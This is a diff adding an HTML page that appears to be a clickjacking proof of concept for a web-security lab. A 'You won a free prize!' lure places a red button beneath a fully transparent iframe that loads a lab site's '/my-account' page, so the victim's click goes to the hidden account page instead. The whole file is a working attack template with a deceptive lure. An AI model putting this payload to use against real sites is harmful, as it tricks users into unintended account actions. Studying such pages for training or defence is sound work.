@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win a free prize</title>
+    <style>
+        #exploit-button {
+            background: red;
+            font-size: 30px;
+            position: absolute;
+            top: 630px;
+            left: 400px;
+            z-index: 1;
+            width: 100%;
+            height: 100%;
+        }
+
+        #exploit-button:hover {
+            background: darkred;
+        }
+
+        #iframe {
+            width: 100%;
+            height: 100vh;
+            z-index: 2;
+            opacity: 0;
+        }
+        
+    </style>
+</head>
+<body>
+    <h1>You won a free prize!</h1>
+    <p>Use the button bellow to redeem it.</p>
+    <button id="exploit-button">click</button>
+    <iframe id="iframe" allowtransparency="true" src="https://ac521f7c1e45b83bc0c76696006600f6.web-security-academy.net/my-account">
+
+    </iframe>
+</body>
+</html>
